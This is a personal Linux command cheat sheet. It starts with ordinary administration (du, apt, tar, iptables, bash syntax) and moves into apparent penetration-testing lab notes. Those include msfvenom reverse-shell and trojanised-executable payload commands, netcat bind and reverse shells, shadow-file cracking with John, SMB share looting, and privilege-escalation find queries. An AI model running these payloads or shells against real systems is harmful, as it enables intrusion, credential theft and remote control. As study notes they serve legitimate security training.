1) Directory space utility [du]

du -h                                   ** -h, --human-readable  print sizes in human readable format (e.g., 1K 234M 2G)
du  -sh * | sort -nr                    ** Sort folder by sizes
du -sch /*                              ** The sort I used many times and tired it.
du --max-depth=1 -hx /                  ** very handy one
                                        ** -d, --max-depth=N => Just go down one level from / and sum up everything recursively underneath in the tree.
                                        ** -x, --one-file-system  => skip directories on different file systems Stay on one filesystem; don't look at directories that are not on the / partition. In this case that means ignore:
                                          /dev /proc /run /sys

2) Debian package Manager
dpkg --list                             ** list installed packages
apt-get                                 ** debian
apt-get update                          ** synchronize the package index files with remote repositories
apt-get upgrade                         ** actual upgrade
apt-get upgrade bash                    **upgrade the bash package             // apt-get install -only-upgrade=bash


                                        ** Search packages
apt-cache search "kernel"
apt-cache search -n "kernel"            ** Installed and available
apt-cache pkgnames "kernel"             ** Second and third gets packages  that only have kernel in their names.

apt-get install apache2-dev             ** Install a package
sudo dpkg -i /path/to/deb/file          ** Install from a deb file
apt-cache show bash                     ** Show package information
apt-cache depends bash                  ** Dependencies of a package
apt-cache rdepends bash                 ** Reverse Dependencies of a package
apt-cache search metapackage            ** Search meta packages
dpkg -l open-vm-tools                   ** Query a package
apt-get install --only-upgrade [package name]       ** Only upgrade
sudo apt-get install -f
sudo apt-get --purge remove nameofprogram           ** Remove a package
sudo apt-get autoremove                             ** Remove dependencies after deleting a package





3) Count the number of occuernces per line
uniq -c

4) Grep text processing tool
grep [options] pattern [file]

**Extract the exact match.

grep -o // extract only the parts that matches the pattern from the line and not the entire line.

Example to extract links for a an html page
    grep -o 'http://[^"]*' | cut -d "/" -f 3

**More flavors

grep -v // this ouputs the lines not matching the pattern
grep -n // Finds the line number where you have the match
grep -c // counts the number of lines with matches
grep -e // specify more than one matching pattern / use -e for each one
grep // by default it uses unix style regular expressions.
egrep // it uses POSIZ extended regular expressions.

** multiple matches
grep -i -e "Mount count" -e "Check interval" -e "Block Count" dumpe2fs-output-initial

** grep some text from all files in the current directory
grep -Ri DocumentRoot .             ** DocumentRoot is the text we are looking for.

** it hurts
grep -R '$bigtree\["config"\]\["db"\]'
find . -iname '*config*'            ** insensitive case match with wildcard matching

** grep for config lines in a file
grep -v '^#' /etc/ssh/sshd_config | uniq      ** anything that does not have # and eliminates duplicates
cat squid.conf | grep -v ^\#| grep .

** grep with regex aka egrep
grep -E

** grep with surrounding text
cat whatever | grep -A 10 -B 10 PATTERN       ** A for after and B for before [lines before and lines after]

** grep with regexes
.* matches any sequence of characters
. matches an arbitrary character

** force to look inside binary files
--binary-files=t


5) netstat command
view listening sockets via netstat
netstat -antp | grep sshd                     ** View socket opened by the SSH process on the machine.

-a all
-n show ip instead of host names
-t show only tcp connections
-p show process id/name


netstat -g                                    ** View multicast membership
netstat -r                                    ** View routing table
netstat -i                                    ** Kernel Interface table
netstat -s                                    ** Per protocol statistics
netstat --tcp                                 ** TCP statistics
netstat --udp                                 ** UDP statistics
netstat --raw                                 ** View raw sockets.
netstat -route
netstat -M                                    ** Masquerdaing entries


6) list block devices and there ids
blkid

Sample
/dev/sda1: LABEL="Windows" UUID="FA50DCB150DC763B" TYPE="ntfs"
/dev/sda5: LABEL="40GBTWO" UUID="00A0CE7EA0CE7A24" TYPE="ntfs"
/dev/sda6: UUID="7550252c-3da7-4cd9-8da3-71e9ba38e74a" TYPE="ext4"
/dev/sda7: UUID="088fd084-a011-4896-aa93-c0caaad60620" TYPE="swap"


7) chroot
chroot /mnt/mntdrive /bin/bash                ** Change the root directory from the resuce / live cd to the new mounted file system and start the bash shell


8) tar archiving
[malhyari fix this with tar documents]

tar -xf file.name.tar -C /path/to/directory
tar -zxvf file-name.tar.gz                                          ** Extract and decompress
tar -zxvf file-name.tar.gz                                          ** Extract and decompress and keep same permissions
tar -zxvf file-name.tar.gz [file-name]                              ** Extract and decompres one file only
tar -ztvf file-name.tar.gz                                          ** List the files.

tar -cvf name.tar /path/to/directory.
tar -zcvf name.tar.gz /path/to/directory                            ** Compression too in one command
tar tvf data_backup.tar                                             ** Examine the content of the tar file
gzip data_backup.tar                                                ** Compress the backup.tar file.


                                                                    ** Creating an archive with compressions.

tar zcvf source.tar.gz source
tar jcvf source.tar.bz2 source
tar Jcvf source.tar.xz source


                                                                    ** Extracting archives
tar zxvf source.tar.gz
tar jxvf source.tar.bz2                  << bzip
tar Jxvf source.tar.xz



tar function [options] object1 object2 ...
function flags:
-a Append an existing tar file to another existing tar archive file .
-c create a new tar archive file.
-d check the difference between a tar archive file and the file system.
-r append files to the end of an existing tar archive file.
-t list the content of an existing tar archive file .
-u append files to an existing tar archive file that are newer than a file with the same name in the existing archive.
-x extract files from an existing tar archive file.
-C Changes to the specified directory.
-f output results to file.
-j redirect output to the bzip2 command for compression.
-p preserve all files permissions.
-v list files as they are processed.
-z redirect the output to the gizp for compression.



                                                                    ** Easily accessible shortcuts

$ tar mydir.tar mydir ; gzip mydir.tar
$ gunzip mydir.tar.gz ; tar xvf mydir.tar
tar xvf mydir.tar.gz



9) list processes running and using a specific port
lsof -i :22
lsof  -i/-I                                                         ** List tcp and udp connections port usage
                                                                    ** Then using the PID of the listening process
lsof -p [pid]   // all files that are associated with that process

10) amount of free RAM
free -h                                                             ** Human Readable format

11) disk space utility
df -h                                                               ** Human Readable format

12) redirect error and output stream at the same time
do_something 2>& all_output_file

13)important entries in /proc file system
/proc/cpuinfo
/proc/meminfo
/proc/mounts
/proc/swaps
/proc/version
/proc/partitions
/proc/interrupts

13) unzip files with unzip tool
unzip file-name -d <directory in which to put the files>

zip sexy.zip *                                                    ** Create archives with zip command


14) unrar files with unrar tool
unrar e  <file.rar>


15) view processes and memory
top
htop

16) rdp with xfreerdp tool
xfreerdp /v:ip-address-or-hostname  /u:cisco /p:cisco +clipboard /cert-ignore /f


17) copy with scp
scp <localfile> <user@remotesystem>:/home/user/                     ** Copy from local file to remote system
scp -rp /opt/directory1 user@x.y.z.w:/opt/backup/directory1         ** Copy recursivly with directoy


18) Sort tool
sort -n newfile                 ** sorts values in a file numerical
sort -M newfile                 ** sorts values in a file using Months
sort -k 3 -t : -n               ** -t specifies the separator and -k which field to sort

19) Compressing data

Utility:   bzip2              ext:.bz2            Burrows Wheeler block sorting text algorithm.
           compress           ext:.Z              original unix file compression utility.
           gzip :             ext :.gz            GNU project compression utility.Lempel Ziv algorithm.
           zip                ext : .zip/         The unix version of PKZIP program for windows.

Gzip utility :
gzip file-name-to-be-compressed                   ** gzip for compressing files only.
gzcat                           ** Display the content of compressed text files.
gunzip                          ** For uncompressing files .



20) Environemnt variables
                                ** View environment variables
printenv
env
set
export
cat /etc/environment

**Define a local user defined  variable :
myvar=10                        ** Be careful as there are no spaces.

To view all variables including local variables use the command "set".

**Global environement variable
export variable-name            ** Makes the variable global that is accessable from child shells.
unset [variable-name]                   **To remove a variable

                                ** Directly with initialization :
x=10

                                **Using the declare command :

declare: usage: declare [-aAfFgilnrtux] [-p] [name[=value] ...]
        -r readonly
        -i integer
        -a array
        -f function(s)
        -x export

                              **change the proxy
export http_proxy="http://x.x.x.x:8080/"




21) Linux Shells
Q) How can we start a shell in linux ?
a)As a default login shell at login time.
b)As an interactive shell that is started by spawning a subshell.
c)As a non-interactive shell to run a script.


***Understanding the login shell process :
when you login into the system the bash shell starts a login shell. the login shell typically looks for 5 different startup
files:
/etc/profile    >> main file used by all users. The shell executes the commands in this script when you first login.
$HOME/.bash_profile
$HOME/.bashrc
$HOME/.bash_login
$HOME/.profile

22) Sed
sed -i '2d' ~/.ssh/known_hosts              ** deletes the second line from a text
sed "1d"                                    ** removes the first line from a text
                                            ** Replace the first line with some text
sed  "1s/.*/newtext/" file.txt
sed  "1s/x//"
                                            ** Replace slash with a space
 cat shell | sed 's/\\/ /g'

23) Restart Plasma [KDE 5]
kstart plasmashell

24) Change MAC address
ifconfig wlan0 hw ether [MACaddr]

25) Shows processes even those that are with very long command lines
ps -auxwww

26) Show the file acl on a specific file
getfacl [filename]

27) Add read permission for user lisa on the test
setfacl test -m u:lisa:r

28) Network manager CLI
nmcli con                                                       ** Show all interfaces
nmcli con show [conn name]                                      ** Show a specific connection properties
                                                                ** UUID can be used instead of the name
nmcli con modify [conn name] +ipv4.addresses 172.16.2.140/24
nmcli con up [interface name]                                   ** Activate the interface
nmcli con mod <connectionName> ipv4.dns "8.8.8.8 8.8.4.4"       ** Add dns server // conn name is the name of int can be found via nmcli conn


28) Linux Bash Shell Notes
                      ** Arethmetic Expressions

x=$((2+1))
Var1=$[1+2]                                                     ** No spaces
Var2=$[$var1 * 2
                                                                ** Using the let command
let x=(1+2) or let x=1+4
                    ** IF Statement
if condition
then
       statements
else
       statements
fi
                                                                **OR**
If command
        Then
            Commands
Fi

                                                                **OR**

If  command; then
        Commands
        Fi


                                                              ** Nested if

If command1
        Then
                Commands
        Elif      Command2
                Then
                        More commands
        Fi



          ** Conditions
[ -e <filename> ]                       **File exists
                                        ** Check if value of number1 is gt than value of number2
[ $number1 -gt $number2 ]
                                        ** Example
root@userver:~$ if [ -e dec.key ]; then
> echo "file exists"
> else
> echo "no file"
> exit 1
> fi

                                        ** Numeric Comparison
[malhyari fix bash numeric comparison]
N1 -eq N2
N1 -ge N2
N1 -gt N2
N1 -le N2
N1 -lt N2
N1 -ne N2

                                      ** Strings Comparison
str1=str2               #same
Str1 != str2            #not the same
Str1 < str2             # remember to escape special character
Str1 > str2
-n str1                 # has a length greater than zero
-z str1                 # has a length of zero


                                    ** Files Operations
To be verified -n and -Z
-d file                 #check if the file exists and is a directory.
-e file                 # check if the file exists  // works for both files and directories
-f file                 # check if a file exist and is a file
-r file                 #exist and readable
-s file                 # exists and not empty
-w file                 # exists and writable.
-x                      # exists and executable
-o                      # exists and owned by the current user.
-G                      # exists and the group is the same as the current group.

file1 -nt file2         # check if file1 is newer than file2
File1 -ot file2         # check if file1 is older than file2


                        ***Arrays

commands=("$c1" "$c2" "$c3" "$c4" "$c5" "$c6" "$c7" "$c8" "$c9" "$c10")
colours=(blue red white yellow)
####accessing an element in the array :
                ${commands[indice]}

####accessing all elements in a loop :
i=0
####looping over all the commands.
for command in "${commands[@]}"
do
echo "action $i cli command $command"
i=$[$i+1]
done


                      ***Parentheseis
Single Parenthesis - ( ... ) is creating a subshell
Double Parenthesis - (( ... )) is for arithmetic operation
Single Square Bracket - [ ... ] is the syntax for the POSIX test
Double Square Brackets - [[ ... ]] is the syntax for bash conditional expressions (similar to test but more powerful // regexes )

                      ***Case statement
case "$1" in
1)  echo "Sending SIGHUP signal"
    kill -SIGHUP $2
    ;;
2)  echo  "Sending SIGINT signal"
    kill -SIGINT $2
    ;;
3)  echo  "Sending SIGQUIT signal"
    kill -SIGQUIT $2
    ;;
9) echo  "Sending SIGKILL signal"
   kill -SIGKILL $2
   ;;
*) echo "Signal number $1 is not processed"
   ;;
Esac

                    *** Bash For Loops
for test in Alabama Alaska Arizona
do
echo the next state is $test
done
                              ** Very hot syntax
-- C style loop for bash :
for (( i=0;i<=100;i++))
{
// commands to be executed.


                              ** Iterating over the content of a directory
for file in /home/rich/test/*
do
If [ -d “$file” ]
echo found a directory with the name $file
done

                              ** Redirecting the output of a for loop
for
do
done > output.tx
                              ** iterate over a range
for i in {1001..1200}

                              ** While loop
var1=10
while [ $var1 -gt 0 ]
do
echo $var1
var1=$[var1 - 1]
done
                              **looping until we get a response for a ping
root@kali:~/priv-escalation-scripts# while true
> do
> ping -c 1 10.11.1.133
> if [ $? -eq 0 ]               #exit status of the last command
> then
> firefox http://10.11.1.133 &  # start firefox in the background
> break
> fi
> done


            *** Bash Functions
            function_name () {
                   command...
                }

            example
              display () {
                   echo "This is a sample function"
                }

37) Locate
locate [name]
updatedb << update locate database

38) find command
# find /home/user -perm 777 -exec rm '{}' +                                     *** Be careful with this command
# find /etc -iname "*.conf" -mtime -180 -print
# find . -maxdepth 3 -type f -size +2M
#find / -name file 2>/dev/null                ** sends find standard error output to /dev/null
#find / -type d -perm 777 2> /dev/null        ** look for directories with 777 permissions
find / -perm -4000 2>/dev/null                            ** find files with setuid bit set
find . -perm /u=x,g=x,o=x


                                              ** Find programs writable by a user bob
find / \( -type f -or -type d \) \
  \( \
    \( -user bob  -perm -u=w \) -or \
    \( -group bob -perm -g=w \) -or \
    -perm -o=w \
  \) \
  -print 2>/dev/null | grep -v -e otrs -e proc -e sys


                                              ** Find programs writable by a user apache
find / \( -type f -or -type d \) \
  \( \
    \( -user scriptmanager  -perm -u=w \) -or \
    \( -group scriptmanager -perm -g=w \) -or \
    -perm -o=w \
  \) \
  -print 2>/dev/null | grep -v -e otrs -e proc -e sys


                                              ** Find programs writable by a user www-data
find / \( -type f -or -type d \) \
  \( \
    \( -user www-data  -perm -u=w \) -or \
    \( -group www-data -perm -g=w \) -or \
    -perm -o=w \
  \) \
  -print 2>/dev/null | grep -v -e otrs -e proc -e sys



find / \( -type f -or -type d \) \
  \( \
    \( -user scriptmanager  -perm -u=x \) -or \
    \( -group scriptmanager -perm -g=x \) -or \
    -perm -o=w \
  \) \
  -print 2>/dev/null | grep -v -e otrs -e proc -e sys


find directory-location -user {username} -name {file-name}
find / -writable  2>/dev/null
find /home -printf "%f\t%p\t%u\t%g\t%m" | column -t
f : filename
p : path
u : user
g: group
m: permissions

                                          ** owned by the user
find / -user scriptmanager -name "*" 2>/d>

                                          ** execute a command on the file you find
find /home -name .bashrc -exec grep [PATTERN] {} \;
pentesterlab@4023d573c2b9:~$ find /home -name .bashrc -exec grep key  {} \;
find /* -user root -perm -4000 -print 2>/dev/null     // find all suid owned by the root


find /data/tmp  -name *.amp -type f -ctime +2  -exec rm -rf  {} \;
sudo find /data/tmp  -name *.amp -type f -ctime +2  -exec ls  {} \;


39) fstab
fstab layout for automatic persistent mounting by the operating system

<file system> <mount point> <type> <options> <dump> <pass>

<file system>: The first column specifies the mount device. Most distributions now specify partitions by their labels or UUIDs. This practice can help reduce problems if partition numbers change.
<mount point>: The second column specifies the mount point [the logical file system FHS].
<type>: The file system type code is the same as the type code used to mount a filesystem with the mount command. A file system type code of auto lets the kernel auto-detect the filesystem type, which can be a convenient option for removable media devices. Note that this option may not be available for all filesystems out there.
<options>: One (or more) mount option(s).
<dump>: You will most likely leave this to 0 (otherwise set it to 1) to disabbele the dump utility to backup the filesystem upon boot (The dump program was once a common backup tool, but it is much less popular today.)
<pass>: This column specifies whether the integrity of the filesystem should be checked at boot time with fsck. A 0 means that fsck should not check a filesystem. The higher the number, the lowest the priority. Thus, the root partition will most likely have a value of 1, while all others that should be checked should have a value of 2.


cat /etc/fstab                        ** view the content of the fstab file
mount                                 ** view the current mounted file systems
cat /proc/mounts                      ** view the mounts on the proc file system


40) Openssl [the swiss army of the crypto fans]


OpenSSL s_client --connect BSNS-ASA5515-7:443 --servername asd.com
OpenSSL x509 -in sub2.crt -text
OpenSSL asn1parse -inform pem -in sub2.crt
openssl base64 -in pkcs12-1.p12 -out pkcs12-1.txt
openssl pkcs12 -in cert.txt -inkey key.txt -nodes -passin pass:<yourpass> -passout pass:<yourpass> -export -out cert.p12
openssl pkcs7 -in hijazi.p7b -inform DER -print_certs








41) ls


ls -ltr **Sort list by last modified. -time -reverse
ls -lahR     ** an assignement for you.


view SELinux context via ls
ls -Z


ls -i       // view files with inode number.




//view file size in Meg
ls -al --block-size=M *


42)mkdir
mkdir -p /test/test1/test2/test3    ** make directories recursivly


43) Remove an empty dorectory
Rmdir


44)lists uses who can sudo
sudo -l
sudo -e  // edit files instead of running executables it is a shortcut for
sudoedit


45)Transforms all letters from small letters into capital ones
tr "[:lower:]" "[:upper:]" < file1 > file2


46) Remove a char/trim a char
 cat file.txt | tr -d "."


47)Remove all dots and replace them with underscore.
 cat file.txt | tr "." "_"


48) which command
Which
Outputs the path of the binary that you are looking for. It searches through the directories that are
defined in your $PATH variable. which bash # Usually outputs: /bin/bash


49) adding a user
adduser NameOfUser              : << more common one and friendly / perl script
useradd nameOfUser              : native binary
//adding with a group
useradd -G folks moh
adduser sexy -s /bin/bash -d /home/sexy




50) allow the user to do a sudo
echo "username ALL=(ALL) ALL" >> /etc/sudoers


more control
useraccount ALL=/usr/bin/apt-get, /sbin/shutdown










51) switch the user
su NameOfUser


52) remove/delete  user
sudo userdel NameOfUser



53) ps command


display all system process
ps -aux
    ** a : for all users
    ** u : all processes for all users
    ** x : stands for all processes that do not run a tty
ps -ef




controlled formatting of ouput
    example: only the command then use -o



ps -o command
ps -o command,pid






command operates in three styles
Unix, BSD and GNU




ps x                 // shows all of your running processes
ps ax                 // shows all processes on the system not only the ones you own
ps u                 // include more detailed information on the processes
ps w                 // show full command names, not what just fits on one line


ps $$                // shows current process
$$ is a variable that evalutes to the current shell process




54) Installing custom packages
reloved directory for installing custom softwares is /opt


add the installation path to your path variable
add it to the end, if there is a binary conflict it will always choose original one.




55) Cron Jobs


* * * * *
min hours [day of month]  month [day of week] [username] [commands and arguments]
Two ways to configure cron jobs:
First one, is to place your script in one of the following directories:
    ---- /etc/cron.daily
    ---- /etc/cron.hourly
    ---- /etc/cron.weekly
    ---- /etc/cron.monthly


Second way is to write the command in the crontab
#list cronjobs
crontab -l


#Edit or create a new cronjobs
crontab -e




66) fdisk
list the partition in a disk
fdisk -l /dev/sda




67) File system structure
/bin: essential user command binaries
/boot: static files for the boot loader
/dev: device files.
/etc: host specfic system configuration
/home: user home directories
/lib: essential shared libraries and kernel modules
/media: mount point for remoevable media
/mnt: mount point for a temporaray mounted fileystem.
/opt: add-on application software packages.
/sbin: system binaries
/srv: data for services provided by the sytem.
/tmp: temporary files.
/usr: multi-users utilities and applications.
/var: variable files.
/root: home directory for the root user.
/proc: virtual file system documenting kernel and process as text files.


68) Mount
mount /dev/sda1 /home
umount /dev/sda1




69) Systemctl


Systemctl start ssh                       ** start a service
Systemctl stop ssh                        ** stop a service
Systemctl status ssh                      ** query the status of the service.
systemctl enable ssh                      ** make ssh start upon boot.
systemctl enable apache2                  ** make apache2 start upon boot.


70) init.d


/etc/init.d/cron status                   ** query the status of the cron service
/etc/init.d/cron start                    ** start the cron service.
/etc/init.d/cron stop                     ** stop the cron service.


71) Rcconf
This is a tool to control services more easily, what is running upon boot and so on


72) iptables
A linux firewall




the command builds up
table -t defaults to FILTER
Command ( -I : insert/ -A : Append / -D :Delete  )
Chain (INPUT/OUTPUTFORWARD)
Match -m (IP,Protocol,Port)
Target -j (ACCEPT,REJECT, DROp, LOG)






install on centos
yum install -y iptables-services
systemctl enable iptables
systemctl start iptables
config file: /etc/sysconfig/iptables                    // rules can be added in that file directlry
reload : sudo service iptables restart
save config: sudo service iptables save








Type of chains :


Input : for traffic that has the local machine as the destination
Output : for traffic originating from the local machine.
Forward : for traffic routed by the machine


iptables -L                                  #view active rules.
iptables --policy INPUT ACCEPT               # default the input chain.
iptables --policy OUTPUT ACCEPT              # default the output chain.
iptables --policy INPUT DROP                 # drop all traffic.




Example:
=======
Block a connection by appending a new rule.
Block all connection from our enemy 192.168.1.30


# A for append, and S for source.
iptables -A INPUT -s 192.168.1.30 -j DROP           //append at the end
iptables -I INPUT 8 -p tcp --dport 21 -j ACCEPT     // appends at a specific index




# Block an entire range
iptables -A INPUT -s 192.168.1.0/24 -j DROP


# Add label to rules
root@kali:~# iptables -L -v --line-numbers


# Remove a Rule
iptables -D INPUT 2


# Delete all rules
iptables -F


# To save the change
sudo /sbin/iptables-save


# Monitoring BW with iptables
iptables -L -v


#Restart the counters
iptables -Z


#port forwarding with ip tables:
iptables -t nat  -A PREROUTING -i eth0 -p tcp --dport 9090 -j DNAT --to 10.113.102.29:3000


73)  samba client aka smbclient/smb
smbclient -L host           ** see which shares are available on a given host.
smbclient -U [username] -L host   ** specifies the username
-N                          ** No password
--pw-nt-hash                ** the supplied password in an NT hash


smbclient //192.168.25.1/arquivos -N    ** connect to a share on a server with no username
smbclient //192.168.25.1/arquivos -U [username]   ** connect to a share on a server with a username


get multiple files
root@kali:~/labjuly/67-machine/smb# smbclient -N //192.168.42.67/tmp
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *




 mask ""
 recurse ON
 prompt OFF
 mget *




-p  : connect on a specific port number
usually it is 139 or 445




smb ports


• netbios-ns 137/tcp # NETBIOS Name Service
• netbios-ns 137/udp
• netbios-dgm 138/tcp # NETBIOS Datagram Service
• netbios-dgm 138/udp
• netbios-ssn 139/tcp # NETBIOS session service
• netbios-ssn 139/udp
• microsoft-ds 445/tcp # if you are using Active Directory






smb NSE script scans smb vulnerabilities check
nmap -p 139,445 --script=smb-vuln* [target ip]
nmap -p 139,445 --script=smb-vuln-ms08-067 [target ip]   // RCE good one
nmap -p 445 [target] --script=smb-vuln-ms17-010         // eternalblue smbv1 only




78) John the ripper
/root/.john/john.log                 ****john log file
/root/.john/john.pot                 **** john cracked passwords
crack windows hash passwords ]
john --wordlist=/usr/share/wordlists/rockyou.txt pwdump


**** check the pass format for a specific hash
root@kali:~# john --list=format-all-details --format=mysql-sha1
Format label                         mysql-sha1
 Disabled in configuration file      no
Min. password length in bytes        0
Max. password length in bytes        32
Min. keys per crypt                  8
Max. keys per crypt                  8
Flags
 Case sensitive                      yes
 Supports 8-bit characters           yes
 Converts 8859-1 to UTF-16/UCS-2     no
 Honours --encoding=NAME             no
 False positives possible            no
 Uses a bitslice implementation      no
 The split() method unifies case     yes
 A $dynamic$ format                  no
 A dynamic sized salt                no
Number of test vectors               13
Algorithm name                       SHA1 128/128 SSE2 4x2
Format name                          MySQL 4.1+
Benchmark comment
Benchmark length                     -1
Binary size                          20
Salt size                            0
Tunable cost parameters
Example ciphertext                   *5AD8F88516BD021DD43F171E2C785C69F8E54ADB




Crack shadow file
        unshadow /etc/passwd /etc/shadow > pass
john --wordlist=/usr/share/wordlists/rockyou.txt pass


get a list of all subformats






When you look at the hash in your passwd file it has the following scheme:
$*1$*2$*3


*1 is an integer showing the hash type used (1=md5, according to one of the replies 6=SHA)
*2 is the salt
*3 is the hashed password (with the used salt)




-format=Raw-MD5








79)msfvenom
** list available payloads
root@kali:~# msfvenom -l payloads
windows/x64/shell/reverse_tcp


** List available formats
msfvenom  --help-formats


Executable formats
        asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
Transform formats
        bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript






Generate a binary reverse_shell payload for a 32 bit machine
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.11.0.242 LPORT=1234 -b "\x00" -e x86/shikata_ga_nai -f exe -o /ftphome/1.exe




Generate a binary reverse_shell payload for a 64 bit machine


msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=10.11.0.242 LPORT=1234 -b "\x00" -e x64/shikata_ga_nai -f exe -o /ftphome/1.exe


reverse asp shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
https://gist.github.com/sckalath/03b4f3945cb10f9b2575


list of available output formats
msfvenom --help-formats


msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.242 LPORT=443 EXITFUNC=process -b "\x00" -f js_le


find payloads with a specific size ** hotty hot
root@kali:/usr/share/metasploit-framework/tools/modules# ./payload_lengths.rb  | awk ' $2<=210'


msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.242 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.2.3 LPORT=6666 -f raw




*** See available options for a pyaload       ** hotty hot **
 msfvenom --payload-options -p windows/shell/reverse_tcp




*** executable payload for linux  [binary payload]
root@kali:~/cside/java-applet# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.171 LPORT=447 -f elf   > non-staged


*** executable for windows  [binary payload]
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe




*** embed binary payload into an existing executable
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.171 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o win-embeded.exe
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.98.15 LPORT=4444 -f exe -o 1.exe


*** list all available encoderrs
msfvenom -l


in raw format
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.98.15 LPORT=443  --platform windows R > shell.raw


with no exit function and good for code cave
msfvenom  -p windows/shell_reverse_tcp LHOST=192.168.100.XXX LPORT=4444 -f hex EXITFUNC=none






Framework Encoders
==================


    Name                          Rank       Description
    ----                          ----       -----------
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder






windows payload to execute a command
windows/exec cmd=calc.exe




encode an executable without adding any other payload
cat <shellcode_file> | msfvenom -b <bad_chars> -e <encoder> -f <format> -a <arch> --platform <platform> -p -
cat shellcode | msfvenom -b '\x00' -e x86/shikata_ga_nai -f py -a x86 --platform windows -p -






====================================




80) jobs -p
list current jobs started by the user


81) backgrouond a a job
put the & at the end of the command
bg command


82) Bring it back to the terminal
fg










83) Nmap


nmap 10.0.0.1                               **Scan the default range of ports[1-1024]
nmap -Pn 10.0.0.1                           **Same scan but with Ping scan disabled. // disable host discovery
nmap -p 445,139 10.0.0.1                    **scan a range of ports
nmap -A -p 445 10.0.0.1
nmap -sn 10.11.1-254                        ** ping sweep a range of ports/ping scan disable port scan
nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt         ** ping sweep with an output that is very nice.
nmap -O 10.0.0.19                                    ** OS fingerprinting/detection
nmap -A/-sV                                          ** banner grabbing/service enumeration
nmap -A                                             ** aggressive scan for OS detection version detection script scanning
nmap -p 80 --script=check-vuln-msxt.nse 10.0.0.1     ** scan the target using this nse script.
nmap --script=http-enum -p80 -n 10.11.1.71
nmap --script=vuln --script-timeout 600 10.11.1.237
nmap -sV                                            ** Services Scan
nmap -sT                                            ** tcp connect scan
nmap -sS                                            ** syn scan/stealth scan [very fast, raw sockets]
nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com       ** nmap dns zone transfer
nmap -iL smb.hosts                                  ** read from a file
nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt  ** snmp scan
nmap -p 130-145,445                                 ** scan a range of ports.
nmap -p netbios*,microsoft-ds [target host]         ** scan using the services names.
nmap -sU -sS -p U:137-139,T:137-139,445 [target host] ** multiple/mixed scans


-n  // never do DNS resolution
-R // always do dns resolution
--dns-server // use this dns server




NMAP scripting engine
1)nmap --script-help ftp-anon     ** get help on how to use a certain script


2)scripts categories:
default: used in the default script scan -sC or --script
safe: script is safe not to use and not designed to crash services.
auth: script uses credentials to login into the target system




3) Arguments can be passed to the script with the --scripts-args or scripts-args-file options












get a list of a available scripts
root@kali:~/humble# nmap --script-help=mongo*






** update the scripts


nmap --script-updatedb






84) netcat
nc.exe
nc -nlvp 10000                                       **listen on a specific port
nc -nlvp 10000 -e /bin/bash                          ** listen and provide a linux bind shell
nc -nlvp 10000 -e cmd.exe                            ** listen and provide a windows bind shell
nc -nv 10.0.0.1 4444                                 ** connect to the server on that port
nc -nv 10.0.0.1 4444 -e cmd.exe             ** connect to the server and provide windows reverse shell
